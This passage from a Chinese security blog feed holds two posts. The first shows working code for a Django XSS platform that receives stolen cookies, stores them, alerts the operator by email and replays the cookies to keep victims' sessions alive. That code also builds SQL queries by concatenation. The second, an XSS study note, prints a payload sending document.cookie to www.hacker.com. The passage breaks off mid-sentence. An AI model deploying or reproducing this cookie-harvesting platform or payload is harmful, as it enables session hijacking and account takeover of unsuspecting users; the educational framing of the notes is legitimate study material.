class="line">根据url值动态返回相应的javascript代码</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import pymysql,os</span><br><span class="line">from user.safeio import re_check</span><br><span class="line"></span><br><span class="line">def get_info(url):</span><br><span class="line">    if not re_check(url,&#39;num_letter&#39;):</span><br><span class="line">        return &#39;default&#39;</span><br><span class="line">    db &#x3D; pymysql.connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;,&#39;xss&#39;)</span><br><span class="line">    cursor &#x3D; db.cursor()</span><br><span class="line">    cursor.execute(&quot;Select name From projects Where url&#x3D;&#39;&quot;+url+&quot;&#39;&quot;)</span><br><span class="line">    js_name &#x3D; cursor.fetchone()[0]</span><br><span class="line">    if js_name &#x3D;&#x3D; None:</span><br><span class="line">        return &#39;default&#39;</span><br><span class="line">    else:</span><br><span class="line">        return (js_name)</span><br><span class="line"></span><br><span class="line">def get_js_value(url):</span><br><span class="line">    js_name &#x3D; get_info(url)</span><br><span class="line">    file &#x3D; &#39;\\script\\&#39;+js_name + &#39;.js&#39;</span><br><span class="line">    js_value &#x3D; open(os.getcwd()+file).read()</span><br><span class="line">    js_value &#x3D; js_value.replace(&#39;&lt;-1234-&gt;&#39;,url)</span><br><span class="line">    return js_value</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import pymysql,time</span><br><span class="line">from .getscript import get_info</span><br><span class="line"></span><br><span class="line">def connect():</span><br><span class="line">    try:</span><br><span class="line">        db &#x3D; pymysql.connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;, &#39;xss&#39;)</span><br><span class="line">        cursor &#x3D; db.cursor()</span><br><span class="line">        return db,cursor</span><br><span class="line">    except:</span><br><span class="line">        print(&#39;连接数据库失败，正在尝试重新连接&#39;)</span><br><span class="line">        connect()</span><br><span class="line"></span><br><span class="line">def put_letter(requests,url):</span><br><span class="line">    now_time &#x3D; time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;,time.localtime(time.time()))[2:]</span><br><span class="line">    if &#39;HTTP_X_FORWARDED_FOR&#39; in requests.META:</span><br><span class="line">        ip &#x3D; requests.META[&#39;HTTP_X_FORWARDED_FOR&#39;]</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            ip &#x3D; requests.META[&#39;REMOTE_ADDR&#39;]</span><br><span class="line">        except:</span><br><span class="line">            ip &#x3D; &#39;0.0.0.0&#39;</span><br><span class="line">    ip &#x3D; ip.replace(&quot;&#39;&quot;,&quot;\&#39;&quot;)</span><br><span class="line">    origin &#x3D; requests.GET.get(&#39;location&#39;,&#39;Unknown&#39;).replace(&quot;&#39;&quot;,&quot;\&#39;&quot;)</span><br><span class="line">    software &#x3D; requests.META.get(&#39;HTTP_USER_AGENT&#39;,&#39;Unknown&#39;).replace(&quot;&#39;&quot;,&quot;\&#39;&quot;)</span><br><span class="line">    method &#x3D; requests.method.replace(&quot;&#39;&quot;,&quot;\&#39;&quot;)</span><br><span class="line">    data &#x3D; requests.GET.get(&#39;cookie&#39;,&#39;No data&#39;).replace(&quot;&#39;&quot;,&quot;\&#39;&quot;)</span><br><span class="line">    keep_alive &#x3D; requests.GET.get(&#39;keepsession&#39;,&#39;0&#39;).replace(&quot;&#39;&quot;,&quot;\&#39;&quot;)</span><br><span class="line">    list &#x3D; [now_time,ip,origin,software,method,data,keep_alive]</span><br><span class="line">    put_mysql(list,url)</span><br><span class="line"></span><br><span class="line">def put_mysql(list,url):</span><br><span class="line">    db,cursor &#x3D; connect()</span><br><span class="line">    name &#x3D; get_info(url)</span><br><span class="line">    cursor.execute(&quot;Select user From projects Where url&#x3D;&#39;&quot;+url+&quot;&#39;&quot;)</span><br><span class="line">    user &#x3D; cursor.fetchone()[0]</span><br><span class="line">    m_query &#x3D; &quot;INSERT INTO letters(time,name,ip,origin,software,method,data,user,keep_alive) VALUES(&#39;&#123;0&#125;&#39;,&#39;&#123;1&#125;&#39;,&#39;&#123;2&#125;&#39;,&#39;&#123;3&#125;&#39;,&#39;&#123;4&#125;&#39;,&#39;&#123;5&#125;&#39;,&#39;&#123;6&#125;&#39;,&#39;&#123;7&#125;&#39;,&#39;&#123;8&#125;&#39;)&quot;</span><br><span class="line">    m_query &#x3D; m_query.format(list[0],name,list[1],list[2],list[3],list[4],list[5],user,list[6])</span><br><span class="line">    cursor.execute(m_query)</span><br><span class="line">    db.commit()</span><br><span class="line">    db.close()</span><br><span class="line"></span><br><span class="line">def get_letters(username):</span><br><span class="line">    db, cursor &#x3D; connect()</span><br><span class="line">    m_query &#x3D; &quot;SELECT * FROM letters WHERE user &#x3D; &#39;&#123;&#125;&#39;&quot;</span><br><span class="line">    m_query &#x3D; m_query.format(username)</span><br><span class="line">    cursor.execute(m_query)</span><br><span class="line">    result_list &#x3D; cursor.fetchall()</span><br><span class="line">    return result_list</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#160; &#160; &#160; &#160;既然我们知道了xss脚本会将信息构造通过GET的参数形式传给XSS平台，我们只需在服务器接受数据并保存即可。  </p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>&#160; &#160; &#160; &#160;我们可以为我们的平台编写新的功能以完善我们的平台，如邮件提醒，cookie活性保持等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">邮件发送</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">import smtplib</span><br><span class="line">from email.mime.text import MIMEText</span><br><span class="line">from email.utils import formataddr</span><br><span class="line"></span><br><span class="line">my_sender&#x3D;&#39;xxxx&#39;</span><br><span class="line">my_pass &#x3D; &#39;xxxx&#39;</span><br><span class="line"></span><br><span class="line">def send_mail(user_mail):</span><br><span class="line">    try:</span><br><span class="line">        print(user_mail)</span><br><span class="line">        msg&#x3D;MIMEText(&#39;您点的外卖已送达，请登录平台查询&#39;,&#39;plain&#39;,&#39;utf-8&#39;)</span><br><span class="line">        msg[&#39;From&#39;]&#x3D;formataddr([&quot;XSS平台&quot;,my_sender])</span><br><span class="line">        msg[&#39;To&#39;]&#x3D;formataddr([&quot;顾客&quot;,user_mail])</span><br><span class="line">        msg[&#39;Subject&#39;]&#x3D;&quot;您点的外卖已送达，请登录平台查询&quot;</span><br><span class="line">        server&#x3D;smtplib.SMTP_SSL(&quot;smtp.qq.com&quot;, 465)</span><br><span class="line">        server.login(my_sender, my_pass)</span><br><span class="line">        server.sendmail(my_sender,[user_mail,],msg.as_string())</span><br><span class="line">        server.quit()</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;&#39;</span><br><span class="line">使用独立于主线程的其他线程</span><br><span class="line">来保持通用项目的cookie信息&#39;活性&#39;</span><br><span class="line">默认保持一个小时的活性</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">import requests,queue,time,pymysql</span><br><span class="line"></span><br><span class="line">Cookie_Time &#x3D; 1</span><br><span class="line"></span><br><span class="line">def decrease(time,number):</span><br><span class="line">    if time &lt; number:</span><br><span class="line">        time &#x3D; &#39;0&#39;+str(time)</span><br><span class="line">    else:</span><br><span class="line">        time &#x3D; str(time)</span><br><span class="line">    return time</span><br><span class="line"></span><br><span class="line">def count_time(now_time):</span><br><span class="line">    global Cookie_Time</span><br><span class="line">    year &#x3D; int(now_time[0:2])</span><br><span class="line">    month &#x3D; int(now_time[3:5])</span><br><span class="line">    day &#x3D; int(now_time[6:8])</span><br><span class="line">    hours &#x3D; int(now_time[9:11])</span><br><span class="line">    if hours &lt; Cookie_Time:</span><br><span class="line">        if day &#x3D;&#x3D; 1:</span><br><span class="line">            if month &#x3D;&#x3D; 1:</span><br><span class="line">                month&#x3D;12</span><br><span class="line">                year -&#x3D; 1</span><br><span class="line">            else:</span><br><span class="line">                day&#x3D;30</span><br><span class="line">                month -&#x3D; 1</span><br><span class="line">        else:</span><br><span class="line">            day -&#x3D; 1</span><br><span class="line">            hours +&#x3D; 19</span><br><span class="line">    else:</span><br><span class="line">        hours -&#x3D; 5</span><br><span class="line">    hours &#x3D; decrease(hours,10)</span><br><span class="line">    day &#x3D; decrease(day,10)</span><br><span class="line">    month &#x3D; decrease(month,10)</span><br><span class="line">    year &#x3D; decrease(year,10)</span><br><span class="line">    dec_time &#x3D; (&quot;&#123;0&#125;-&#123;1&#125;-&#123;2&#125; &#123;3&#125;&quot;).format(year,month,day,hours) + now_time[11:]</span><br><span class="line">    return dec_time</span><br><span class="line"></span><br><span class="line">def create_queue():</span><br><span class="line">    Cookie_queue &#x3D; queue.Queue()</span><br><span class="line">    now_time &#x3D; time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;, time.localtime(time.time()))[2:]</span><br><span class="line">    dec_time &#x3D; count_time(now_time)</span><br><span class="line">    m_query &#x3D; (&quot;SELECT software,origin,data FROM letters WHERE name&#x3D;&#39;default&#39; and time&gt;&#39;&#123;&#125;&#39; and keep_alive &#x3D; &#39;1&#39;&quot;).format(dec_time)</span><br><span class="line">    db &#x3D; pymysql.connect(&#39;127.0.0.1&#39;,&#39;root&#39;,&#39;root&#39;,&#39;xss&#39;)</span><br><span class="line">    cursor &#x3D; db.cursor()</span><br><span class="line">    cursor.execute(m_query)</span><br><span class="line">    return_list &#x3D; cursor.fetchall()</span><br><span class="line">    for x in return_list:</span><br><span class="line">        Cookie_queue.put(x)</span><br><span class="line">    return Cookie_queue</span><br><span class="line"></span><br><span class="line">def action():</span><br><span class="line">    while True:</span><br><span class="line">        time.sleep(60)</span><br><span class="line">        task_queue &#x3D; create_queue()</span><br><span class="line">        while not task_queue.empty():</span><br><span class="line">            tasks &#x3D; task_queue.get()</span><br><span class="line">            url &#x3D; tasks[1]</span><br><span class="line">            ua &#x3D; tasks[0]</span><br><span class="line">            cookie &#x3D; tasks[2]</span><br><span class="line">            headers &#x3D; &#123;&#39;User-Agent&#39;: ua, &#39;Cookie&#39;: cookie&#125;</span><br><span class="line">            try:</span><br><span class="line">                requests.get(url, headers&#x3D;headers)</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br></pre></td></tr></table></figure><p>&#160; &#160; &#160; &#160;注意这里需要使用独立于django主线程的子线程，比如我在manager.py里添加了这么一段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">from xssplatform.keep_alive import action</span><br><span class="line"></span><br><span class="line">class keep_Thread(threading.Thread):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super(keep_Thread,self).__init__()</span><br><span class="line">    def run(self):</span><br><span class="line">        action()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    th &#x3D; keep_Thread()</span><br><span class="line">    th.start()</span><br></pre></td></tr></table></figure><br>短链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;&#39;</span><br><span class="line">短链接生成</span><br><span class="line">接口c7.gg</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">import requests,json</span><br><span class="line"></span><br><span class="line">Headers &#x3D; &#123;</span><br><span class="line">    &quot;accept&quot; : &quot;application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01&quot;,</span><br><span class="line">    &quot;accept-encoding&quot; : &quot;gzip, deflate, br&quot;,</span><br><span class="line">    &quot;accept-language&quot; : &quot;zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8&quot;,</span><br><span class="line">    &quot;content-length&quot; : &quot;53&quot;,</span><br><span class="line">    &quot;content-type&quot; : &quot;application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8&quot;,</span><br><span class="line">    &quot;origin&quot; : &quot;https:&#x2F;&#x2F;www.985.so&quot;,</span><br><span class="line">    &quot;referer&quot; : &quot;https:&#x2F;&#x2F;www.985.so&#x2F;&quot;,</span><br><span class="line">    &quot;user-agent&quot; : &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;63.0.3239.132 Safari&#x2F;537.36&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def url_to_short(url):</span><br><span class="line">    global Headers</span><br><span class="line">    data &#x3D; &#123;&#39;type&#39;:&#39;c7&#39;,&#39;url&#39;:url&#125;</span><br><span class="line">    r &#x3D; requests.post(&#39;https:&#x2F;&#x2F;create.ft12.com&#x2F;done.php?m&#x3D;index&amp;a&#x3D;urlCreate&#39;,data&#x3D;data,headers&#x3D;Headers)</span><br><span class="line">    list &#x3D; json.loads(r.text)</span><br><span class="line">    return list[&#39;list&#39;]</span><br></pre></td></tr></table></figure></p><h1 id="4-最后"><a href="#4-最后" class="headerlink" title="4) 最后"></a>4) 最后</h1><p>&#160; &#160; &#160; &#160;其实看起来高大上的XSS平台原理就那么简单，真正难的部分是关于XSS跨站脚本的编写。<br>&#160; &#160; &#160; &#160;此项目已开源于<a href="https://github.com/HackerYunen/django-xss-platform">Github</a>，有任何问题可以提交issue，我会在第一时间进行回复。<br>&#160; &#160; &#160; &#160;我不会不断更新此项目，感兴趣的朋友可以多多关注我的<a href="http://www.0x002.com">博客</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
            <tag> XSS </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端Hack之XSS攻击个人学习笔记</title>
      <link href="2019/%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2019/%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="简单概述"><a href="#简单概述" class="headerlink" title="简单概述"></a>简单概述</h1><p><strong>&#160;此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此次总结是我在学习过程中所写，如有任何错误，敬请各位读者斧正。其中有许多内容属于相关书籍、文章的部分摘取，如有侵权，请联系我修改。(asp-php#foxmail.com)</strong></p><h2 id="1-什么是XSS"><a href="#1-什么是XSS" class="headerlink" title="1) 什么是XSS?"></a>1) 什么是XSS?</h2><p><strong>&#160; &#160;XSS(Cross-Site Script,跨站脚本)是由于web应用程序对用户的输入过滤不足而产生的一种漏洞。攻击者可以利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码，对受害者产生各种攻击。</strong><br>&#160; &#160; &#160; &#160;如果对以上描述还不是很了解的话，可以参考<a href="https://baike.baidu.com/item/xss/917356">百度百科</a><br>&#160; &#160; &#160; &#160;在<strong>余弦大大</strong>和<strong>xisigr大大</strong>的书籍《Web前端安全技术揭秘》第三章中这样说道：</p><blockquote><p>跨站脚本的重点不在“跨站”上，而应该在“脚本”上…因为这个“跨”实际上属于浏览器的特性，而不是缺陷，造成“跨”的假象是因为绝大多数的XSS攻击都会采用嵌入一段远程或者说第三方域上的脚本资源。</p></blockquote><a id="more"></a><p>&#160; &#160; &#160; &#160;确实，当攻击者的服务器上的js嵌入到受害者的页面，至于接下来的攻击就是关于“脚本”的事了。</p><h2 id="2-XSS可以带来哪些危害？"><a href="#2-XSS可以带来哪些危害？" class="headerlink" title="2) XSS可以带来哪些危害？"></a>2) XSS可以带来哪些危害？</h2><p>&#160; &#160; &#160; &#160;对于XSS攻击的危害，大多数的人们却没有正确的认识，实际上攻击者可以利用XSS攻击造成巨大的危害。比如：</p><ul><li>网页挂马;</li><li>盗取Cookie;</li><li>DoS攻击;</li><li>钓鱼攻击;</li><li>蠕虫攻击;</li><li>劫持用户web行为;</li><li>结合CSRF进行针对性攻击;</li><li>······</li></ul><p>这些都是可以利用XSS漏洞来达成的。</p><h2 id="3-XSS类型"><a href="#3-XSS类型" class="headerlink" title="3) XSS类型"></a>3) XSS类型</h2><p>目前的XSS总共可以分为三种类型：</p><ul><li><strong>反射型(也叫非持久型)</strong></li><li><strong>存储型(也叫持久型)</strong></li><li><strong>DOM型</strong></li></ul><p>PS：前两种XSS都会与服务器产生交互，后一种不会产生交互。(某安全大佬面试)</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p><strong>反射型XSS，也称非持久型XSS，最常见也是使用最广的一种。在反射型XSS中，payload一般存在于网页的Url中，只用户单击时触发，只执行一次，非持久化，故称反射型XSS。攻击者发送恶意Url链接让受害者点击(一般会对payload部分进行处理，如：编码转换和短域名跳转)</strong><br>&#160; &#160; &#160; &#160;由于篇幅问题，关于反射型XSS我就不做过多简述。<br>&#160; &#160; &#160; &#160;有的人认为反射型XSS需要用户已经登陆的情况下才能利用，其实不然。我们可以通过反射型xss让浏览器远程嵌入我们的js文件，然后配合浏览器漏洞进行RCE攻击。这里给出个相近的例子：<a href="https://xz.aliyun.com/t/3919">记一次从DOM型XSS到RCE过程</a>。  </p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>&#160; &#160; &#160; &#160;<strong>存储型XSS，也称持久型XSS，攻击者首先将恶意javascript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意javascript页面就会执行恶意代码，不需要用户点击特定Url就能执行，故存储型XSS比反射型XSS更具威胁性。— 《XSS跨站脚本攻击剖析与防御》</strong><br>&#160; &#160; &#160; &#160;存储型XSS与反射型XSS最大的区别就在于提交的XSS代码会储存于服务端，下次再访问目标页面时不用再提交XSS代码。—《Web前端黑客技术揭秘》</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>&#160; &#160; &#160; &#160;<strong>许多朋友对反射型XSS和存储型XSS都比较清楚，可是却不太了解什么是DOM型XSS，没关系，看完这里你就应该会对DOM型XSS有个大概认识<br>&#160; &#160; &#160; &#160;DOM,即Document Object Model(文件对象模型)的缩写，关于DOM的概念想了解的朋友可以在<a href="https://baike.baidu.com/item/DOM/50288">百度百科</a>得到相应的解答。</strong><br>&#160; &#160; &#160; &#160;DOM型XSS是如何产生的？我们知道，客户端javascipt是可以访问浏览器的DOM文本对象模型，如果没有经过适当的过滤和消毒，那么应用程序可能会受到基于DOM的XSS攻击。<br>&#160; &#160; &#160; &#160;在<strong>刺</strong>的《白帽子讲Web安全》是这样讲的：</p><blockquote><p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS，也就是DOM型XSS。</p></blockquote><p>&#160; &#160; &#160; &#160;举个简单的例子(来自《Web前端黑客技术揭秘》)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">...</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var a&#x3D;document.URL;</span><br><span class="line">document.write(a.substring(a.indexOf(&quot;a&#x3D;&quot;)+2,a.length));</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">...</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;把以上代码保存为1.html,然后打开浏览器访问<code>http://127.0.0.1/1.html#a=test</code><br>&#160; &#160; &#160; &#160;我们知道这是个静态页面，而且#后边的内容并不会传给服务器。<br><img src="https://img.0x002.com/article/FrontEndHack/5c839d5c04d33.webp" alt="访问结果"></p><p>&#160; &#160; &#160; &#160;可是这样就不会产生XSS漏洞了吗？如果我们访问<br><code>http://127.0.0.1/.html#a=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>&#160; &#160; &#160; &#160;当我们访问上述url时，服务器会返回源代码，我们可以用抓包工具截取，发现与正常访问的页面无差别，可是当浏览器收到源代码时便把HTML文本解析成DOM对象并执行，结果弹出/xss/消息框，感兴趣的朋友可以试试。<br>&#160; &#160; &#160; &#160;具体执行过程如图：<img src="https://img.0x002.com/article/FrontEndHack/5c83cca814d51.webp" alt="来自《黑客攻防技术宝典Web实战篇》"></p><h2 id="4-XSS的利用方式"><a href="#4-XSS的利用方式" class="headerlink" title="4) XSS的利用方式"></a>4) XSS的利用方式</h2><p>&#160; &#160; &#160; &#160;前面我们介绍了各种XSS的特点及产生方式，现在我们来说说如何利用这些漏洞。</p><h3 id="Cookie窃取"><a href="#Cookie窃取" class="headerlink" title="Cookie窃取"></a>Cookie窃取</h3><p><strong>&#160; &#160; &#160; &#160;Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。如：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>会弹出当前页面的cookie信息。</strong>  </p><hr><p>&#160; &#160; &#160; &#160;这里我们引入一个叫做“同源策略”的概念：</p><blockquote><p>首先，同“源”的源不单单是指两个页面的主域名，还包括这两个域名的协议、端口号和子级域名相同。举个例子，假设我现在有一个页面<code>http://www.a.com/index.html</code>，域名是 <code>www.a.com</code>，二级域名为 www,协议是 http，端口号是默认的 80，这个页面的同源情况如下：<img src="https://img.0x002.com/article/FrontEndHack/5c84907479e30.webp" alt=""><br>&#160; &#160; &#160; &#160;同源策略存在的意义就是为了保护用户的信息的安全。一般网站都会把关于用户的一些敏感信息存在浏览器的 cookie 当中试想一下，如果没有同源策略的保护，那么 b 页面也可以随意读取 a 页面存储在用户浏览器 cookie 中的敏感信息，就会造成信息泄露。如果用户的登录状态被恶意网站能够随意读取，那后果不堪设想。由此可见，同源策略是非常必要的，可以说是浏览器安全的基石。<br>&#160; &#160; &#160; &#160;除了 cookie 的访问受到同源策略的限制外，还有一些操作也同样受到同源策略的限制：<br>&#160; &#160; &#160; &#160;(1) 无法读取非同源网页的 Cookie 、sessionStorage 、localStorage 、IndexedDB<br>&#160; &#160; &#160; &#160;(2) 无法读写非同源网页的 DOM<br>&#160; &#160; &#160; &#160;(3) 无法向非同源地址发送 AJAX请求（可以发送，但浏览器会拒绝响应而报错）</p></blockquote><p>&#160; &#160; &#160; &#160;————引自<strong>晚风</strong>表哥在信安之路上的投稿文章<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247487543&amp;idx=1&amp;sn=924a5d5f37fa27d053187cf6a740ba8e&amp;chksm=ec1e201fdb69a909bda97b7e5af3aaffb2853a95694310d2463fe139468b96a55cf7e25edc6c&amp;mpshare=1&amp;scene=23&amp;srcid=#rd">《同源策略与跨域请求》</a>  </p><hr><p>&#160; &#160; &#160; &#160;我们知道Cookie有如下常见的属性：</p><ul><li>Domain————设置关联Cookie的域名;</li><li>Expires————通过给定一个过期时间来创建一个持久化Cookie;</li><li>Httponly————用于避免Cookie被Javascript访问;</li><li>Name————Cookie的名称;</li><li>Path————关联到Cookie的路径，默认为/;</li><li>Value————读写Cookie的值;</li><li>Secure————用于指定Cookie需要通过安全Socket层传递连接;  </li></ul><p>&#160; &#160; &#160; &#160;并且Cookie也可以安装类型分为：</p><ul><li>本地Cookie————即储存在计算机硬盘中，关闭浏览器后依旧存在;</li><li>内存Cookie————即储存在内存中，随浏览器的关闭而消失;  </li></ul><p>&#160; &#160; &#160; &#160;如何区分两者很简单，只要判断cookie中的expires即过期时间属性有没有设置，如果设置了即为本地cookie，反之为内存cookie。<br>&#160; &#160; &#160; &#160;由于Cookie具有的不同属性，我们可以将不同属性的Cookie盗取方式分为以下几种情况</p><h4 id="默认"><a href="#默认" class="headerlink" title="默认"></a>默认</h4><p>&#160; &#160; &#160; &#160;默认情况，即不对Cookie的任何属性进行指定就设置Cookie的情况。这种情况下Cookie的获取最为简单。可以通过下列方式获取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">new Image().src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></p><h4 id="不同域"><a href="#不同域" class="headerlink" title="不同域"></a>不同域</h4><p>&#160; &#160; &#160; &#160;这是由于domain字段的机制导致的。一个Cookie如果不知道domain的值，则默认为<strong>本域</strong>。<br>&#160; &#160; &#160; &#160;例如有两个网站<code>www.a.com</code>和<code>test.a.com</code>且后者存在xss漏洞，按照同源策略，这两个网站是不同源的，默认情况下我们无法直接从<code>test.a.com</code>获取到<code>www.a.com</code>的Cookie，可是如果<code>www.a.com</code>的Cookie值中的domain属性设置为父级域即<code>a.com</code>，就可以通过<code>test.a.com</code>的xss漏洞获取到<code>www.a.com</code>的Cookie值。</p><h4 id="不同路径"><a href="#不同路径" class="headerlink" title="不同路径"></a>不同路径</h4><p>&#160; &#160; &#160; 